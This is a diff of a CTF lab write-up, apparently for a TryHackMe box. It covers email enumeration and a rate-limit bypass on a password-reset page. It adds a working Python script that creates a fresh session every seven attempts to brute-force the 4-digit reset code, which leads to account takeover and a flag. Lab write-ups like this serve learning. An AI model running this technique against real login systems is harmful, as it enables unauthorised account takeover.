@@ -1,7 +1,6 @@
 
 Authentication Bypass and RCE
 
-
 # Enumeration 
 
 ## Nmap Scan
@@ -44,9 +43,7 @@ Great, looks like some information:
 -  Apparently Lock-down mechaniosm in place 
 
 
-# Bypassing
-
-## Overview of the login page
+# Overview of the login page
 Login page does not provide username enumeration since incorrect login cause the display of a generic message.
 ![](../../Pasted%20image%2020250826011548.png)
 Although, the Forgot Password, allows for valid email enumeration, since it displays an **"Invalid Email address"** if the email is not registered. 
@@ -78,8 +75,82 @@ Got a new session cookie to use.
 ![](../../Pasted%20image%2020250827001436.png)
 Sent two just to confirm xd. The rate limiting is reset to 8 tries using a new session. This means, it is possible to bypass the rate limiting mechanism creating a new session for each 7 requests and try possible 4-digit codes in the 180 seconds interval (each session).
 
+# Brute Forcing Reset Code
+
+``` python
+import requests
+
+URL = "http://hammer.thm:1337/reset_password.php"
+EMAIL = "tester@hammer.thm"
+
+def get_new_session():
+    # Request a new PHPSESSID by sending the email reset form.
+    s = requests.Session()
+    data = {"email": EMAIL}
+    r = s.post(URL, data=data)
+    if "PHPSESSID" not in s.cookies:
+        raise Exception("Failed to get PHPSESSID")
+    return s
+
+def try_code(session, code):
+    """Submit a 4-digit code using the given session."""
+    payload = {
+        "recovery_code": str(code).zfill(4),
+        "s": "174"   # static value from your requests
+    }
+    r = session.post(URL, data=payload)
+    return r
+
+def is_success(response, baseline_length):
+    """Decide if response indicates success (different length/contents)."""
+    return len(response.text) != baseline_length
+
+# ---------------- MAIN -----------------
+print("[*] Getting baseline response...")
+baseline_session = get_new_session()
+baseline_resp = try_code(baseline_session, 9999)  # guaranteed wrong
+baseline_length = len(baseline_resp.text)
+
+print(f"[*] Baseline response length: {baseline_length}")
+print("[*] Starting brute-force...")
+
+attempts = 0
+
+for code in range(0, 10000):
+    if attempts % 7 == 0:  # refresh session every 7 tries
+        session = get_new_session()
+
+    resp = try_code(session, code)
+    attempts += 1
+
+    if is_success(resp, baseline_length):
+        print(f"\n[+] SUCCESS! Code: {code:04d}")
+        print("[+] Session cookie:", session.cookies.get_dict())
+       # print("[+] Response snippet:\n", resp.text[:300])
+        break
 
 
+```
+
+How It Works
+```
+1. **Baseline**: gets the length of a known invalid response (e.g., `9999`).
+2. **Loop 0000–9999**:
+    - Every 7 attempts → requests a new session (to reset rate limit).
+    - Submits the code with that session.
+3. **Detect success**: compares response length vs baseline.
+    - If it’s different → likely success 
+4. **Stops immediately** and prints code + session cookie.
+```
+
+Executed it and got the session that found the correct code:
+
+![](../../Pasted%20image%2020250827011527.png)
+Used that session value to update the cookie on the opened browser and refresh the reset password page:
+![](../../Pasted%20image%2020250827011614.png)
+Changed it to `test123` and confirmed. Then used it to login and got the first flag: 
+![](../../Pasted%20image%2020250827011913.png)
 
 
+# Enumeration  -  Part II :)
 
